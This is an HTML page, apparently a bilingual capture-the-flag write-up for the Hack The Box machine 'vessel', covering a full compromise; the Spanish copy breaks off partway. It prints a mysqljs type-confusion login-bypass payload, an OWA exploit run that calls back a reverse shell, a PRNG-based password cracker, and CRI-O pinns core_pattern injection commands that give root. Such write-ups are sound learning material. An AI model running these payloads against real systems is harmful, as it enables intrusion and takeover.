@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>vessel | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">vessel</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed a <code>.git</code> repository in the <code>/dev/</code> directory, which I dumped to discover the application source code. The code revealed a Node.js Express application using the deprecated <code>mysqljs</code> library, vulnerable to SQL injection via type confusion. By sending JSON parameters as objects instead of strings, I bypassed the authentication mechanism and gained administrative access to the web panel.</p>
+                    
+                    <p>Through the admin panel, I discovered a subdomain running Open Web Analytics (OWA) version 1.7.3. I exploited CVE-2022-24637, an unauthenticated RCE vulnerability that leverages cache poisoning to gain admin credentials, then creates a malicious PHP log file that acts as a webshell. This granted me initial access as <code>www-data</code>.</p>
+                    
+                    <p>In <code>/home/steven</code>, I found a Windows executable named <code>passwordGenerator</code> and a password-protected PDF. Using <code>pyinstxtractor</code> and <code>uncompyle6</code>, I extracted and decompiled the Python code, discovering it used PySide2's weak PRNG seeded with milliseconds. I generated all 1,000 possible passwords and cracked the PDF, revealing credentials for user <code>ethan</code>.</p>
+                    
+                    <p>As <code>ethan</code>, I discovered a SUID binary <code>/usr/bin/pinns</code> belonging to CRI-O, vulnerable to CVE-2022-0811. This vulnerability allows injecting additional kernel parameters through insufficient validation. I exploited it to modify <code>kernel.core_pattern</code>, pointing it to a malicious script that made <code>/bin/bash</code> SUID. Triggering a segmentation fault executed the script as root, granting me full system access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Git repository exposure, mysqljs SQL injection via type confusion, Open Web Analytics 1.7.3 RCE (CVE-2022-24637), Python executable extraction and decompilation (pyinstxtractor, uncompyle6), PySide2 PRNG weakness, PDF password cracking, CRI-O kernel parameter injection (CVE-2022-0811).</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports 22 (SSH) and 80 (HTTP)" /></p>
+                
+                <p>The scan reveals SSH on port 22 and an HTTP server on port 80. Running <code>whatweb</code> provides additional information about the web technologies in use:</p>
+                
+                <pre><code class="language-plaintext">http://10.10.11.178 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], 
+Email[name@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
+IP[10.10.11.178], Script, Title[Vessel], X-Powered-By[Express]</code></pre>
+                
+                <p>The <code>X-Powered-By: Express</code> header indicates the application is built with Express, a Node.js web framework. This tells me the backend is likely written in JavaScript or TypeScript.</p>
+                
+                <h2>Web Enumeration - Registration Issues</h2>
+                <p>When attempting to create an account, I notice unusual behavior:</p>
+                <p><img src="./media/image5.png" alt="Registration page showing form fields but no parameters sent in POST request" /></p>
+                
+                <p>The registration form displays normally, but when inspecting the network traffic, I see that POST requests aren't actually sending any parameters to the backend. This is suspicious behavior that suggests client-side issues or possibly incomplete functionality.</p>
+                
+                <h2>Directory Enumeration</h2>
+                <p>Running directory fuzzing reveals several interesting routes:</p>
+                
+                <pre><code class="language-plaintext">/css          (Status: 301) [Size: 173] [--> /css/]
+/img          (Status: 301) [Size: 173] [--> /img/]
+/dev          (Status: 301) [Size: 173] [--> /dev/]
+/login        (Status: 200) [Size: 4213]
+/admin        (Status: 200) [Size: 4213]
+/js           (Status: 200) [Size: 742]
+/logout       (Status: 200) [Size: 4213]
+/charts       (Status: 200) [Size: 2400]
+/register     (Status: 200) [Size: 5830]
+/401          (Status: 200) [Size: 2400]
+/500          (Status: 200) [Size: 2335]
+/tables       (Status: 200) [Size: 2400]
+/reset        (Status: 200) [Size: 3637]</code></pre>
+                
+                <p>The <code>/admin</code> route redirects to login, and both <code>/charts</code> and <code>/tables</code> return 401 Unauthorized responses. I also discover a <code>/api/</code> endpoint, but fuzzing with various HTTP methods yields no results.</p>
+                
+                <p>In the page footer, I notice a reference to <code>vessel.htb</code>, which I add to my <code>/etc/hosts</code> file for proper name resolution.</p>
+                
+                <h2>Git Repository Discovery</h2>
+                <p>While fuzzing subdirectories, I make a critical discovery in <code>/dev/</code>:</p>
+                
+                <pre><code class="language-plaintext">/.git/HEAD    (Status: 200) [Size: 23]
+/.git/config  (Status: 200) [Size: 139]
+/.git/index   (Status: 200) [Size: 2607]</code></pre>
+                
+                <p>An exposed <code>.git</code> repository is a severe security misconfiguration. I use <code>git-dumper</code> to download the entire repository:</p>
+                
+                <pre><code class="language-bash">python3 git-dumper.py http://vessel.htb/dev/.git/ ./vessel-repo</code></pre>
+                
+                <h3>Source Code Analysis</h3>
+                <p>Examining the downloaded repository, I find database credentials in <code>db.js</code>:</p>
+                
+                <pre><code class="language-javascript">var connection = {
+    db: {
+        host: 'localhost',
+        user: 'default',
+        password: 'daqvACHKvRn84VdVp',
+        database: 'vessel'
+    }
+};</code></pre>
+                
+                <p>More importantly, I notice a suspicious comment in the code:</p>
+                
+                <pre><code class="language-javascript">var mysql = require('mysql'); /* Upgraded deprecated mysqljs */</code></pre>
+                
+                <p>This comment raises a red flag. The mention of "deprecated mysqljs" suggests there may have been security issues with the previous version.</p>
+                
+                <h2>SQL Injection via Type Confusion</h2>
+                <p>Searching for "mysqljs SQL injection," I find this excellent research article: <a href="https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/">Finding an Unseen SQL Injection by Bypassing Escape Functions in mysqljs/mysql</a></p>
+                
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability stems from how Express.js handles JSON parameters. The <code>mysqljs</code> library expects string parameters but doesn't properly validate the parameter types. When a parameter is passed as an object or array instead of a string, the escape functions fail to properly sanitize the input.</p>
+                
+                <p>This means I can bypass authentication by manipulating the parameter types in the login request. Instead of sending:</p>
+                
+                <pre><code class="language-json">{"username": "admin", "password": "wrongpassword"}</code></pre>
+                
+                <p>I can send:</p>
+                
+                <pre><code class="language-json">{"username": "admin", "password": {"password": 1}}</code></pre>
+                
+                <h3>Exploiting the Login Bypass</h3>
+                <p>I modify the login request to exploit the type confusion vulnerability:</p>
+                
+                <pre><code class="language-http">POST /api/login HTTP/1.1
+Host: vessel.htb
+Content-Type: application/json
+Content-Length: 51
+
+{"username": "admin", "password": {"password": 1}}</code></pre>
+                
+                <p>This successfully bypasses authentication and grants me access to the admin panel and other protected pages.</p>
+                
+                <h2>Open Web Analytics Discovery</h2>
+                <p>While exploring the admin panel, I discover a reference to a subdomain:</p>
+                
+                <pre><code class="language-plaintext">http://openwebanalytics.vessel.htb/</code></pre>
+                
+                <p>I add this to my <code>/etc/hosts</code> file and navigate to the site:</p>
+                <p><img src="./media/image1.png" alt="Open Web Analytics login page showing version information" /></p>
+                
+                <p>This is an open-source PHP analytics framework. More information can be found at <a href="https://www.openwebanalytics.com/">https://www.openwebanalytics.com/</a> and the GitHub repository at <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics">https://github.com/Open-Web-Analytics/Open-Web-Analytics</a></p>
+                
+                <h2>Open Web Analytics RCE - CVE-2022-24637</h2>
+                <p>Although the version isn't immediately visible, I find an exploit from 2022 (matching the machine's release date): <a href="https://www.exploit-db.com/exploits/51026">EDB-ID 51026</a> for unauthenticated RCE.</p>
+                
+                <p>First, I verify the target is vulnerable using the exploit's check functionality:</p>
+                
+                <pre><code class="language-bash">python3 owa.py -c http://openwebanalytics.vessel.htb 10.10.16.2 443</code></pre>
+                
+                <pre><code class="language-plaintext">[SUCCESS] Connected to "http://openwebanalytics.vessel.htb/" successfully!
+[ALERT] The webserver indicates a vulnerable version!</code></pre>
+                
+                <h3>Understanding the Exploit</h3>
+                <p>The exploit works through multiple stages:</p>
+                <ol>
+                    <li>Exploits a cache vulnerability to access administrator session data without authentication</li>
+                    <li>Uses the obtained credentials to authenticate as admin</li>
+                    <li>Changes the admin password to maintain access</li>
+                    <li>Creates a malicious "log" file that is actually PHP code</li>
+                    <li>Uses this PHP file as a webshell to execute commands</li>
+                    <li>Triggers a reverse shell back to the attacker</li>
+                </ol>
+                
+                <p>The vulnerability leverages the fact that OWA generates cached user data for the administrator that is accessible without proper authentication, allowing attackers to retrieve sensitive session information.</p>
+                
+                <h3>Getting Initial Access</h3>
+                <p>I run the full exploit to obtain a reverse shell:</p>
+                
+                <pre><code class="language-bash">python3 owa.py http://openwebanalytics.vessel.htb 10.10.16.2 443</code></pre>
+                
+                <p>This successfully grants me access as the <code>www-data</code> user. I can now see two users in <code>/home</code>:</p>
+                
+                <pre><code class="language-bash">ls -la /home</code></pre>
+                
+                <pre><code class="language-plaintext">total 16
+drwxr-xr-x  4 root   root   4096 Aug 11  2022 .
+drwxr-xr-x 19 root   root   4096 Aug 11  2022 ..
+drwx------  5 ethan  ethan  4096 Aug 11  2022 ethan
+drwxrwxr-x  3 steven steven 4096 Aug 11  2022 steven</code></pre>
+                
+                <p>I try the database password found earlier with both users, but it doesn't work for SSH or <code>su</code>.</p>
+                
+                <h2>Enumeration as www-data</h2>
+                <p>I have read access to Steven's home directory and discover unusual files:</p>
+                
+                <pre><code class="language-bash">ls -la /home/steven</code></pre>
+                
+                <pre><code class="language-plaintext">total 33796
+drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
+drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
+lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -> /dev/null
+-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
+-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
+drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
+-rw------- 1 steven steven      807 Apr 17  2022 .profile
+-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator</code></pre>
+                
+                <p>The <code>.notes</code> directory contains additional files:</p>
+                
+                <pre><code class="language-bash">ls -la /home/steven/.notes/</code></pre>
+                
+                <pre><code class="language-plaintext">total 40
+drwxr-xr-x 2 ethan  steven  4096 Aug 11  2022 .
+drwxrwxr-x 3 steven steven  4096 Aug 11  2022 ..
+-rw-r--r-- 1 ethan  steven 17567 Aug 10  2022 notes.pdf
+-rw-r--r-- 1 ethan  steven 11864 May  2  2022 screenshot.png</code></pre>
+                
+                <p>Checking the file type of the suspicious executable:</p>
+                
+                <pre><code class="language-bash">file passwordGenerator</code></pre>
+                
+                <pre><code class="language-plaintext">passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
+                
+                <p>It's a Windows executable. I transfer all three files to my machine for analysis.</p>
+                
+                <h2>Analyzing the Password Generator</h2>
+                <p>The screenshot provides a clue about how the password was generated:</p>
+                <p><img src="./media/image2.png" alt="Screenshot of passwordGenerator application showing a GUI with password generation options" /></p>
+                
+                <p>The PDF is password-protected, preventing access:</p>
+                <p><img src="./media/image4.png" alt="Password-protected PDF prompting for credentials" /></p>
+                
+                <p>Based on the screenshot, I theorize that the password for the PDF was generated using this Windows executable.</p>
+                
+                <h3>Extracting Python Code from the Executable</h3>
+                <p>I transfer the executable to a Windows VM for analysis. When I add the <code>.exe</code> extension, the file icon indicates it's Python-related. Using <code>strings</code>, I find references to <code>pyside2</code>, confirming this is a compiled Python application using the PySide2 GUI framework.</p>
+                
+                <p>I use <code>pyinstxtractor</code> to extract the packaged Python code:</p>
+                
+                <pre><code class="language-bash">python pyinstxtractor.py passwordGenerator.exe</code></pre>
+                
+                <p>This extracts numerous files, including <code>passwordGenerator.pyc</code>, which contains the compiled bytecode. To convert this back to readable Python source, I use <code>uncompyle6</code>:</p>
+                
+                <pre><code class="language-bash">pip install uncompyle6
+uncompyle6 passwordGenerator.pyc > passwordGenerator.py</code></pre>
+                
+                <h3>Analyzing the Password Generation Logic</h3>
+                <p>The decompiled code reveals the character sets used for password generation:</p>
+                
+                <pre><code class="language-python">if char == 0:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?"
+elif char == 1:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+elif char == 2:
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</code></pre>
+                
+                <p>These correspond to three options: all characters, alphabetic only, or alphanumeric only.</p>
+                
+                <p>The critical password generation code is:</p>
+                
+                <pre><code class="language-python">qsrand(QTime.currentTime().msec())
+password = ""
+for i in range(length):
+    idx = qrand() % len(charset)
+    nchar = charset[idx]
+    password += str(nchar)</code></pre>
+                
+                <h3>Identifying the Weakness</h3>
+                <p>The vulnerability lies in the PRNG initialization. The <code>qsrand()</code> function seeds the random number generator with <code>QTime.currentTime().msec()</code>, which returns the millisecond component of the current time.</p>
+                
+                <p>According to the Qt documentation (<a href="https://doc.qt.io/qt-6/qtime.html#msec">QTime::msec()</a>), this function returns a value between 0 and 999. This means there are only 1,000 possible seeds, and therefore only 1,000 possible passwords for any given configuration!</p>
+                
+                <h2>Bruteforcing the PDF Password</h2>
+                <p>Since the randomness is limited to 1,000 possible values, I can generate all possible passwords and use them to crack the PDF. I create a Python script to generate the wordlist:</p>
+                
+                <pre><code class="language-python">from PySide2.QtCore import qsrand, qrand
+
+def genPassword(ms: int) -> str:
+    length = 32
+    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
+    qsrand(ms)
+    password = ''
+    for i in range(length):
+        idx = qrand() % len(charset)
+        nchar = charset[idx]
+        password += str(nchar)
+    return password
+
+passwords = [genPassword(i) for i in range(1000)]
+
+with open('passwords.txt', 'w') as f:
+    f.write('\n'.join(passwords))</code></pre>
+                
+                <p>I run this script in my Windows VM with Python 3.10 and PySide2 installed. Once I have the wordlist, I use <code>pdfcrack</code> to test all passwords:</p>
+                
+                <pre><code class="language-bash">pdfcrack -f notes.pdf -w passwords.txt</code></pre>
+                
+                <pre><code class="language-plaintext">PDF version 1.6
+Security Handler: Standard
+V: 2
+R: 3
+P: -1028
+Length: 128
+Encrypted Metadata: True
+FileID: c19b3bb1183870f00d63a766a1f80e68
+U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
+O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
+
+found user-password: 'YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS'</code></pre>
+                
+                <p>Success! The password is cracked almost instantly.</p>
+                
+                <h2>Lateral Movement to User Ethan</h2>
+                <p>Opening the PDF reveals a note from Ethan to Steven:</p>
+                
+                <blockquote>
+                    <p>Dear Steven,</p>
+                    <p>As we discussed since I'm going on vacation you will be in charge of system maintenance. Please ensure that the system is fully patched and up to date.</p>
+                    <p>Here is my password: <strong>b@mPRNSVTjjLKId1T</strong></p>
+                    <p>System Administrator<br>Ethan</p>
+                </blockquote>
+                
+                <p>I now have credentials for the <code>ethan</code> user. I can SSH or <code>su</code> to this account:</p>
+                
+                <pre><code class="language-bash">ssh ethan@vessel.htb</code></pre>
+                
+                <p>After logging in as Ethan, I check for sudo privileges but find none. His home directory doesn't contain anything immediately useful, so I need to look elsewhere for privilege escalation.</p>
+                
+                <h2>Privilege Escalation - CRI-O pinns SUID</h2>
+                <p>Searching for files owned by the <code>ethan</code> group, I discover an interesting SUID binary:</p>
+                
+                <pre><code class="language-bash">find / -group ethan 2>/dev/null | grep -v /proc | grep -v /sys | grep -v /home | grep -v /run</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/pinns</code></pre>
+                
+                <p>Testing the binary reveals unusual behavior:</p>
+                
+                <pre><code class="language-bash">pinns</code></pre>
+                
+                <pre><code class="language-plaintext">[pinns:e]: Path for pinning namespaces not specified: Invalid argument</code></pre>
+                
+                <pre><code class="language-bash">pinns --help
+pinns --version</code></pre>
+                
+                <pre><code class="language-plaintext">Segmentation fault (core dumped)</code></pre>
+                
+                <p>The binary doesn't have standard command-line options like <code>--help</code>, which is unusual. Searching for "pinns vulnerabilities" leads me to CVE-2022-0811: <a href="https://www.sysdig.com/blog/cve-2022-0811-cri-o">CRI-O Container Escape Vulnerability</a></p>
+                
+                <h3>Understanding CRI-O and the Vulnerability</h3>
+                <p>The <code>pinns</code> binary is part of CRI-O, a container runtime interface similar to Docker. Its source code is available at <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c">GitHub</a>.</p>
+                
+                <p>One of <code>pinns</code>'s functionalities is setting kernel parameters through the <code>-s</code> flag. The vulnerability (CVE-2022-0811) exists because the binary only validates the first parameter to ensure it's a legitimate kernel parameter, but fails to validate additional parameters concatenated with <code>+</code>.</p>
+                
+                <p>For example:</p>
+                <pre><code class="language-bash">pinns -s 'param1=1+param2=2'</code></pre>
+                
+                <p>Here, <code>param1</code> is validated, but <code>param2</code> is not, allowing injection of arbitrary kernel parameters.</p>
+                
+                <h3>Exploiting kernel.core_pattern</h3>
+                <p>The <code>kernel.core_pattern</code> parameter is particularly dangerous. It defines what happens when a program crashes and dumps core. Normally, it looks like this:</p>
+                
+                <pre><code class="language-bash">cat /proc/sys/kernel/core_pattern</code></pre>
+                
+                <pre><code class="language-plaintext">|/usr/share/apport/apport %p %s %c %d %P %E</code></pre>
+                
+                <p>The pipe (<code>|</code>) at the beginning means the core dump is piped to the specified program, which runs as root. By modifying this to point to my own script, I can execute arbitrary code as root when any process crashes.</p>
+                
+                <h3>Exploitation Steps</h3>
+                <p>First, I create a malicious script that will make <code>/bin/bash</code> SUID:</p>
+                
+                <pre><code class="language-bash">cat > /tmp/xd.sh << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+chmod +x /tmp/xd.sh</code></pre>
+                
+                <p>Now I inject the malicious <code>core_pattern</code> value using <code>pinns</code>:</p>
+                
+                <pre><code class="language-bash">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/xd.sh #' -f file -d /tmp -U</code></pre>
+                
+                <pre><code class="language-plaintext">[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted</code></pre>
+                
+                <p>Despite the error message, the kernel parameter is successfully modified. I can verify this:</p>
+                
+                <pre><code class="language-bash">cat /proc/sys/kernel/core_pattern</code></pre>
+                
+                <pre><code class="language-plaintext">|/tmp/xd.sh #</code></pre>
+                
+                <p>Perfect! Now I need to trigger a crash to execute my script. I start a background process and kill it with SIGSEGV:</p>
+                
+                <pre><code class="language-bash">sleep 100 &
+killall -s SIGSEGV sleep</code></pre>
+                
+                <pre><code class="language-plaintext">[1]+ Segmentation fault (core dumped) sleep 100</code></pre>
+                
+                <p>The segmentation fault triggers the core dump handler, which executes my script as root. Checking <code>/bin/bash</code>:</p>
+                
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash</code></pre>
+                
+                <p>Excellent! The SUID bit is set. I can now spawn a root shell:</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>I now have full root access and can retrieve the root flag to complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía un repositorio <code>.git</code> en el directorio <code>/dev/</code>, el cual descargué para descubrir el código fuente de la aplicación. El código revelaba una aplicación Node.js Express usando la librería obsoleta <code>mysqljs</code>, vulnerable a inyección SQL mediante confusión de tipos. Enviando parámetros JSON como objetos en lugar de cadenas, pude saltarme el mecanismo de autenticación y obtener acceso administrativo al panel web.</p>
+                    
+                    <p>A través del panel de administración, descubrí un subdominio ejecutando Open Web Analytics (OWA) versión 1.7.3. Exploté CVE-2022-24637, una vulnerabilidad de RCE no autenticado que aprovecha envenenamiento de caché para obtener credenciales de administrador, luego crea un archivo PHP de log malicioso que actúa como webshell. Esto me otorgó acceso inicial como <code>www-data</code>.</p>
+                    
+                    <p>En <code>/home/steven</code>, encontré un ejecutable de Windows llamado <code>passwordGenerator</code> y un PDF protegido por contraseña. Usando <code>pyinstxtractor</code> y <code>uncompyle6</code>, extraje y decompiló el código Python, descubriendo que usaba el PRNG débil de PySide2 inicializado con milisegundos. Generé las 1.000 contraseñas posibles y crackeé el PDF, revelando credenciales para el usuario <code>ethan</code>.</p>
+                    
+                    <p>Como <code>ethan</code>, descubrí un binario SUID <code>/usr/bin/pinns</code> perteneciente a CRI-O, vulnerable a CVE-2022-0811. Esta vulnerabilidad permite inyectar parámetros de kernel adicionales mediante validación insuficiente. Lo exploté para modificar <code>kernel.core_pattern</code>, apuntándolo a un script malicioso que hizo <code>/bin/bash</code> SUID. Provocar un fallo de segmentación ejecutó el script como root, otorgándome acceso completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Exposición de repositorio Git, inyección SQL en mysqljs mediante confusión de tipos, RCE en Open Web Analytics 1.7.3 (CVE-2022-24637), extracción y decompilación de ejecutable Python (pyinstxtractor, uncompyle6), debilidad de PRNG en PySide2, crackeo de contraseña de PDF, inyección de parámetros de kernel en CRI-O (CVE-2022-0811).</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos 22 (SSH) y 80 (HTTP)" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y un servidor HTTP en el puerto 80. Ejecutando <code>whatweb</code> proporciona información adicional sobre las tecnologías web en uso:</p>
+                
+                <pre><code class="language-plaintext">http://10.10.11.178 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], 
+Email[name@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
+IP[10.10.11.178], Script, Title[Vessel], X-Powered-By[Express]</code></pre>
+                
+                <p>La cabecera <code>X-Powered-By: Express</code> indica que la aplicación está construida con Express, un framework web de Node.js. Esto me dice que el backend probablemente está escrito en JavaScript o TypeScript.</p>
+                
+                <h2>Enumeración Web - Problemas de Registro</h2>
+                <p>Al intentar crear una cuenta, noto un comportamiento inusual:</p>
+                <p><img src="./media/image5.png" alt="Página de registro mostrando campos de formulario pero sin parámetros enviados en la petición POST" /></p>
+                
+                <p>El formulario de registro se muestra normalmente, pero al inspeccionar el tráfico de red, veo que las peticiones POST en realidad no están enviando ningún parámetro al backend. Este es un comportamiento sospechoso que sugiere problemas del lado del cliente o posiblemente funcionalidad incompleta.</p>
+                
+                <h2>Enumeración de Directorios</h2>
+                <p>Ejecutando fuzzing de directorios revela varias rutas interesantes:</p>
+                
+                <pre><code class="language-plaintext">/css          (Status: 301) [Size: 173] [--> /css/]
+/img          (Status: 301) [Size: 173] [--> /img/]
+/dev          (Status: 301) [Size: 173] [--> /dev/]
+/login        (Status: 200) [Size: 4213]
+/admin        (Status: 200) [Size: 4213]
+/js           (Status: 200) [Size: 742]
+/logout       (Status: 200) [Size: 4213]
+/charts       (Status: 200) [Size: 2400]
+/register     (Status: 200) [Size: 5830]
+/401          (Status: 200) [Size: 2400]
+/500          (Status: 200) [Size: 2335]
+/tables       (Status: 200) [Size: 2400]
+/reset        (Status: 200) [Size: 3637]</code></pre>
+                
+                <p>La ruta <code>/admin</code> redirige a login, y tanto <code>/charts</code> como <code>/tables</code> devuelven respuestas 401 No Autorizado. También descubro un endpoint <code>/api/</code>, pero el fuzzing con varios métodos HTTP no arroja resultados.</p>
+                
+                <p>En el pie de página, noto una referencia a <code>vessel.htb</code>, que añado a mi archivo <code>/etc/hosts</code> para una resolución de nombres adecuada.</p>
+                
+                <h2>Descubrimiento del Repositorio Git</h2>
+                <p>Mientras fuzzeo subdirectorios, hago un descubrimiento crítico en <code>/dev/</code>:</p>
+                
+                <pre><code class="language-plaintext">/.git/HEAD    (Status: 200) [Size: 23]
+/.git/config  (Status: 200) [Size: 139]
+/.git/index   (Status: 200) [Size: 2607]</code></pre>
+                
+                <p>Un repositorio <code>.git</code> expuesto es una mala configuración de seguridad grave. Uso <code>git-dumper</code> para descargar el repositorio completo:</p>
+                
+                <pre><code class="language-bash">python3 git-dumper.py http://vessel.htb/dev/.git/ ./vessel-repo</code></pre>
+                
+                <h3>Análisis del Código Fuente</h3>
+                <p>Examinando el repositorio descargado, encuentro credenciales de base de datos en <code>db.js</code>:</p>
+                
+                <pre><code class="language-javascript">var connection = {
+    db: {
+        host: 'localhost',
+        user: 'default',
+        password: 'daqvACHKvRn84VdVp',
+        database: 'vessel'
+    }
+};</code></pre>
+                
+                <p>Más importante, noto un comentario sospechoso en el código:</p>
+                
+                <pre><code class="language-javascript">var mysql = require('mysql'); /* Upgraded deprecated mysqljs */</code></pre>
+                
+                <p>Este comentario levanta una bandera roja. La mención de "mysqljs obsoleto" sugiere que puede haber habido problemas de seguridad con la versión anterior.</p>
+                
+                <h2>Inyección SQL mediante Confusión de Tipos</h2>
+                <p>Buscando "mysqljs SQL injection," encuentro este excelente artículo de investigación: <a href="https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/">Finding an Unseen SQL Injection by Bypassing Escape Functions in mysqljs/mysql</a></p>
+                
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad surge de cómo Express.js maneja parámetros JSON. La librería <code>mysqljs</code> espera parámetros de tipo string pero no valida adecuadamente los tipos de parámetros. Cuando un parámetro se pasa como objeto o array en lugar de string, las funciones de escape fallan en sanitizar adecuadamente la entrada.</p>
+                
+                <p>Esto significa que puedo saltarme la autenticación manipulando los tipos de parámetros en la petición de login. En lugar de enviar:</p>
+                
+                <pre><code class="language-json">{"username": "admin", "password": "wrongpassword"}</code></pre>
+                
+                <p>Puedo enviar:</p>
+                
+                <pre><code class="language-json">{"username": "admin", "password": {"password": 1}}</code></pre>
+                
+                <h3>Explotando el Bypass de Login</h3>
+                <p>Modifico la petición de login para explotar la vulnerabilidad de confusión de tipos:</p>
+                
+                <pre><code class="language-http">POST /api/login HTTP/1.1
+Host: vessel.htb
+Content-Type: application/json
+Content-Length: 51
+
+{"username": "admin", "password": {"password": 1}}</code></pre>
+                
+                <p>Esto salta exitosamente la autenticación y me otorga acceso al panel de administración y otras páginas protegidas.</p>
+                
+                <h2>Descubrimiento de Open Web Analytics</h2>
+                <p>Mientras exploro el panel de admin, descubro una referencia a un subdominio:</p>
+                
+                <pre><code class="language-plaintext">http://openwebanalytics.vessel.htb/</code></pre>
+                
+                <p>Añado esto a mi archivo <code>/etc/hosts</code> y navego al sitio:</p>
+                <p><img src="./media/image1.png" alt="Página de login de Open Web Analytics mostrando información de versión" /></p>
+                
+                <p>Este es un framework de analítica PHP de código abierto. Más información puede encontrarse en <a href="https://www.openwebanalytics.com/">https://www.openwebanalytics.com/</a> y el repositorio de GitHub en <a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics">https://github.com/Open-Web-Analytics/Open-Web-Analytics</a></p>
+                
+                <h2>RCE en Open Web Analytics - CVE-2022-24637</h2>
+                <p>Aunque la versión no es inmediatamente visible, encuentro un exploit de 2022 (coincidiendo con la fecha de lanzamiento de la máquina): <a href="https://www.exploit-db.com/exploits/51026">EDB-ID 51026</a> para RCE no autenticado.</p>
+                
+                <p>Primero, verifico que el objetivo sea vulnerable usando la funcionalidad de comprobación del exploit:</p>
+                
+                <pre><code class="language-bash">python3 owa.py -c http://openwebanalytics.vessel.htb 10.10.16.2 443</code></pre>
+                
+                <pre><code class="language-plaintext">[SUCCESS] Connected to "http://openwebanalytics.vessel.htb/" successfully!
+[ALERT] The webserver indicates a vulnerable version!</code></pre>
+                
+                <h3>Entendiendo el Exploit</h3>
+                <p>El exploit funciona mediante múltiples etapas:</p>
+                <ol>
+                    <li>Explota una vulnerabilidad de caché para acceder a datos de sesión del administrador sin autenticación</li>
+                    <li>Usa las credenciales obtenidas para autenticarse como admin</li>
+                    <li>Cambia la contraseña de admin para mantener el acceso</li>
+                    <li>Crea un archivo de "log" malicioso que es realmente código PHP</li>
+                    <li>Usa este archivo PHP como webshell para ejecutar comandos</li>
